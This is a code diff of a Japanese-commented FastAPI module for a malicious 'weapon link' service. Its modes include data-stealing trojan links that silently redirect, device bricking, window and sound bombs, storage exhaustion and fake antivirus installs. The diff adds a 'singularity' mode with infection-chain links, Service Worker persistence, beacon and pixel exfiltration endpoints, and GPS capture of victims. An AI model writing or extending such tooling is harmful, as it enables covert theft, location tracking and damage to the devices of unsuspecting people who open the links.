@@ -14,6 +14,13 @@
   POST /vp/{code}/set           1セット枚数（10/100/0=無限）
   GET  /api/vp/{code}           データJSON
 
+  --- SINGULARITY モード（最上位兵器） ---
+  GET  /v/{code}/sg             本体ページ（singularity.py のペイロードを起動）
+  GET  /v/{code}/sg/{sid}       子リンク（感染チェーン継承）
+  GET  /v/{code}/sg/sw.js       Service Worker（復活機構）
+  POST /v/{code}/sg/c           報告の投入（fetch/beacon）
+  GET  /v/{code}/sg/c           報告の投入（画像ピクセル経路）
+
 モード:
   trojan_link    トロイの木馬（リンク型）
   trojan_install トロイの木馬（常駐型）
@@ -22,18 +29,19 @@
   windows        爆音窓爆弾（音＋大量ウィンドウ）
   storage        容量枯渇
   mix            全部ミックス
+  singularity    特異点（全12系統統合の最上位兵器）
 
 設計:
   兵器ページはボタン無し。開いた瞬間から全部自動・無限。
   枚数や発射・停止はこちらの監視室から遠隔操作する（兵器ページがポーリング）。
-  通知バナーで「偽の対策ソフト（＝指定した兵器）を入れさせる」ことができる。
+  通知バナーで「偽の対策ソフト（＝指定した兵器）」を入れさせることができる。
 """
 from __future__ import annotations
 
 import os
 import re
 import json
-import base64          # ← 追加
+import base64
 import random
 import string
 import sqlite3
@@ -49,7 +57,7 @@ router = APIRouter()
 
 MODES = ["trojan_link", "trojan_install", "max_power", "brick",
          "windows", "storage", "mix", "singularity"]
-MODE_ALIAS = {"sound": "windows", "sg": "singularity"}
+MODE_ALIAS = {"sound": "windows", "sg": "singularity"}   # 旧 sound は爆音窓爆弾へ統合
 
 MODE_LABEL = {
     "trojan_link": "トロイの木馬（リンク型）",
@@ -59,7 +67,7 @@ MODE_LABEL = {
     "windows": "爆音窓爆弾（音＋大量ウィンドウ）",
     "storage": "容量枯渇",
     "mix": "全部ミックス",
-    "singularity": "特異点（SINGULARITY）",     # ← 追加
+    "singularity": "特異点（SINGULARITY）",
 }
 MODE_DESC = {
     "trojan_link": "開いた瞬間に全部抜き取って、何事もなかったように本物のサイトへ飛ばす。",
@@ -101,7 +109,7 @@ CREATE TABLE IF NOT EXISTS virus_links(
 CREATE TABLE IF NOT EXISTS virus_hits(
   id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, ts TEXT, ip TEXT, ua TEXT,
   device TEXT, os TEXT, browser TEXT, inapp TEXT, country TEXT, city TEXT,
-  isp TEXT, vid TEXT);
+  isp TEXT, vid TEXT, gps_lat REAL, gps_lon REAL);
 CREATE INDEX IF NOT EXISTS virus_hits_code ON virus_hits(code, id);
 CREATE TABLE IF NOT EXISTS virus_data(
   id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, hit INTEGER, vid TEXT,
@@ -400,8 +408,8 @@ def land(code: str, request: Request):
     # ?m= でモード上書き（インストール後の起動用）
     mode = _norm_mode(request.query_params.get("m") or row["mode"])
 
-    if mode == "singularity":                 # ← 追加
-        return _sg_land(code, request)        # ← 追加
+    if mode == "singularity":
+        return _sg_land(code, request)
 
     hid = _record_hit(owner, code, request)
     child = request.query_params.get("w") == "1"
@@ -640,6 +648,8 @@ def delete(request: Request, code: str, u=Depends(_auth)):
     except Exception:
         pass
     return RedirectResponse("/vp", status_code=303)
+
+
 # ===========================================================================
 # SINGULARITY（最上位兵器）を「モード」として統合
 #   /v/{code} で mode=="singularity" を選ぶと、singularity.py の本体を
